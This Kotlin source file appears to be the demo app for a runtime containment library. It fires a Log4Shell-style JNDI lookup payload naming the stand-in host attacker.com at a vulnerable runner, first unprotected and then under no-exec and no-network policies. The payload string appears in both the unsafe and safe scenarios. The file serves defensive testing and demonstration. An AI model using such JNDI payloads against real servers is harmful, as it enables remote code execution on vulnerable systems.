package demo

import io.mazewall.enforcer.api.ContainmentViolationException
import io.mazewall.enforcer.diagnostics.ContainmentViolationDetector
import kotlin.system.exitProcess

fun main(args: Array<String>) {
    val mode = args.getOrNull(0) ?: "all"
    val report = when (mode) {
        "unsafe" -> DemoReport(listOf(runUnsafe()))
        "safe" -> DemoReport(listOf(runSafe()))
        "profile" -> runProfileAndEnforce()
        "both" -> {
            println("Note: 'both' mode runs unsafe + safe only. Use 'all' for the complete demonstration.")
            println("=== Running in UNSAFE mode ===")
            val unsafe = runUnsafe()
            println("\n=== Running in SAFE mode ===")
            DemoReport(listOf(unsafe, runSafe()))
        }
        "all" -> {
            println("=== Running in UNSAFE mode ===")
            val unsafe = runUnsafe()
            println("\n=== Running in SAFE mode ===")
            val safe = runSafe()
            println()
            DemoReport(listOf(unsafe, safe) + runProfileAndEnforce().results)
        }
        "--help", "-h", "help" -> {
            printHelp()
            return
        }
        else -> {
            println("Unknown mode: '$mode'. Run with --help for usage.")
            exitProcess(1)
        }
    }
    println("\n${report.summary()}")
    if (!report.passed) exitProcess(2)
}

internal fun runUnsafe(): ScenarioResult = DemoFixture.create("unsafe").use { fixture ->
    println("\u001b[31;1m[STATUS] BEHAVIORAL PROTECTION: INACTIVE\u001b[0m")
    println("Context: A vulnerable library receives a malicious payload.")
    val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
    val outcome = runCatching { UnsafeRunner.run(payload) }.fold(
        onSuccess = {
            if (fixture.marker.exists()) {
                println("\u001b[31;1m[SECURITY ALERT] SYSTEM COMPROMISED!\u001b[0m")
                ScenarioOutcome.Completed("attack created its marker")
            } else {
                ScenarioOutcome.InfrastructureFailure(IllegalStateException("exploit returned without creating its marker"))
            }
        },
        onFailure = ScenarioOutcome::InfrastructureFailure,
    )
    ScenarioResult("unprotected exploit", ExpectedResult.ALLOWED, outcome)
}

internal fun runSafe(): ScenarioResult = DemoFixture.create("safe").use { fixture ->
    println("\u001b[32;1m[STATUS] BEHAVIORAL PROTECTION: ACTIVE\u001b[0m")
    println("Contract: \u001b[1mPolicy.NO_EXEC\u001b[0m + \u001b[1mPolicy.NO_NETWORK\u001b[0m")
    val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
    val observed = try {
        SafeRunner.run(payload)
        ScenarioOutcome.Completed("attack returned")
    } catch (failure: ContainmentViolationException) {
        val diagnostic = ContainmentViolationDetector.diagnose(failure)
            ?: return@use ScenarioResult(
                "protected exploit",
                ExpectedResult.DENIED,
                ScenarioOutcome.InfrastructureFailure(failure),
            )
        classifyContainmentFailure(failure)
    } catch (failure: Throwable) {
        ScenarioOutcome.InfrastructureFailure(failure)
    }
    val outcome = if (fixture.marker.exists()) ScenarioOutcome.Completed("attack created its marker") else observed
    ScenarioResult("protected exploit", ExpectedResult.DENIED, outcome)
}

internal fun classifyContainmentFailure(failure: Throwable): ScenarioOutcome {
    val diagnostic = ContainmentViolationDetector.diagnose(failure)
    return if (diagnostic?.evidence == io.mazewall.enforcer.api.ContainmentViolationEvidence.OBSERVED_POLICY_DENIAL) {
        ScenarioOutcome.Denied(diagnostic.evidence.name)
    } else {
        ScenarioOutcome.InfrastructureFailure(failure)
    }
}

private fun printHelp() {
    println(
        """
        Usage: DemoApp [mode]

        Modes:
          unsafe   Run the exploit without protection; attack success is expected.
          safe     Run it with NO_EXEC + NO_NETWORK; kernel denial is expected.
          profile  Profile, enforce, and run positive and negative controls.
                   The native file probe is synchronous; io_uring is not exercised.
          all      Run every mode (default).
          both     Run unsafe + safe only.
          --help   Show this message.
        """.trimIndent(),
    )
}
